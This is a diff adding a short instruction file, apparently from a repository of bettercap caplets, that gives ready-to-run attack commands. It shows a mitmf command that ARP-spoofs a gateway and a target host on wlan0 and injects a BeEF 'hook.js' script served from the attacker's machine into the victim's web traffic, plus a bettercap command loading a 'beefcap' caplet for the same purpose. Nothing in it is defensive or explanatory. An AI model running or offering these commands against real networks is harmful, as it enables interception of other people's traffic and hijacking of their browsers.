@@ -1,0 +1,13 @@
+copy this files inside to /usr/share/bettercap/caplets
+---------------------
+mitmf command
+python mitmf.py -arp -spoof -gateway 192.168.1.1 -target 192.168.1.2 -i wlan0 -inject -js-url http://localhost:3000/hook.js
+or
+mitmf -arp -spoof -gateway 192.168.1.1 -target 192.168.1.2 -i wlan0 -inject -js-url http://localhost:3000/hook.js
+---------------------
+bettercap command
+bettercap -iface wlan0 -caplets /usr/share/bettercap/caplets/beefcap/beefcap.cap
+
+
+twitter talipcakir_
+github talipcakir
